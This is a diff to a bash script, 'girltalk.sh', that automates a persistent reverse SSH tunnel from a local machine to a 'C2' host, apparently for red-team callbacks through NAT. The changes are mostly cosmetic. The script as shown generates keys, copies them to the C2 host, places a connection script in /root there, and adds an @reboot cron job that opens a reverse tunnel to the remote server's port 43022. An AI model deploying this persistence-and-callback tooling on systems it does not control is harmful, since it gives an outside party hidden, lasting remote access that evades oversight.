@@ -9,6 +9,9 @@
 #                                                              #
 ################################################################
 
+bold=$(tput bold)
+normal=$(tput sgr0)
+
 
 USAGE="
 A bash script to automate reverse reverse ssh tunnels. Handy for callbacks
@@ -16,20 +19,21 @@ through NAT.
 Flags:
   -a	Specify AWS C2 infrastructure.
   -k    SSH key.
-  -n    Password-based C2 access.
-  -c    C2 host <ip address or routable hostname>.
+  -c    C2 host
   -u	C2 username.
   -l    Local username to use.
   -h	Help text and usage example.
-usage:	 girltalk.sh -c <C2 username> -l <local username> 
-example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface
+usage:	 girltalk.sh -c <C2 hostname or IP> -l <local username> -u <C2 username> 
+example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
 "
+
 
 # Check if any flags were set. If not, print out help.
 if [ $# -eq 0 ]; then
 	echo "$USAGE"
 	exit
 fi
+
 
 # Set flags.
 while getopts "a:k:n:c:u:l:h" FLAG
@@ -40,9 +44,6 @@ do
 			;;
 		k)
 			KEY=$OPTARG
-			;;
-		n)
-			NONAWS=$OPTARG
 			;;
 		c)
 			HOST=$OPTARG
@@ -63,6 +64,7 @@ do
 	esac
 done
 
+
 # Make sure each required flag was actually set.
 if [ -z ${USERC2+x} ]; then
 	echo "Remote username (-u) is not set."
@@ -78,20 +80,19 @@ elif [ -z ${HOST+x} ]; then
 	exit
 fi
 
-if [ ${AWS} = true]; then
-	echo "it works!"
-fi
 
 # Check for connectivity
-echo "### Checking For Internet ###"
+echo "${bold}### Checking For Internet ###"
 if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
     echo "IPv4 is up"
     printf "\n"
+
 
 # Installing deps
 if (systemctl -q is-active sshd.service)
 then
     echo "### SSH is Installed And Running! ###"
+    printf "\n"
 else
     echo "### Installing Dependencies ###"
     sudo apt update && sudo apt upgrade
@@ -102,10 +103,12 @@ else
 fi
     printf "\n"
 
+
 # Generate local key
     echo "### Generating 4096 keypair ###"
     ssh-keygen -b 4096
     printf "\n"
+
 
 # Error checking for user input
     until id "$USERLOCAL" >/dev/null; do
@@ -113,13 +116,16 @@ fi
     done
     printf "\n"
 
+
 # Transfer local key to C2
     echo "### Copying key to C2 host ###"
     ssh-copy-id $HOST
     printf "\n"
 
+
 # Generating an ssh key on your C2
     ssh $HOST 'ssh-keygen'
+
 
 # Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
     echo "### Creating & transferring remote connection script"
@@ -128,6 +134,7 @@ fi
     scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
     printf "\n"
 
+
 # Setup local cron job + cleanup
     echo "### Setting up local cronjob ###"
     echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
@@ -135,10 +142,11 @@ fi
     rm cronsh
     printf "\n"
 
+
 # Finishing script
-    echo "### donezo! Please reboot the machine. ###"
+    echo "### Donezo! Please reboot the machine. ###"
 
 else
-    echo "Please check your network connection"
+    echo "Please check your network connection."
 
 fi
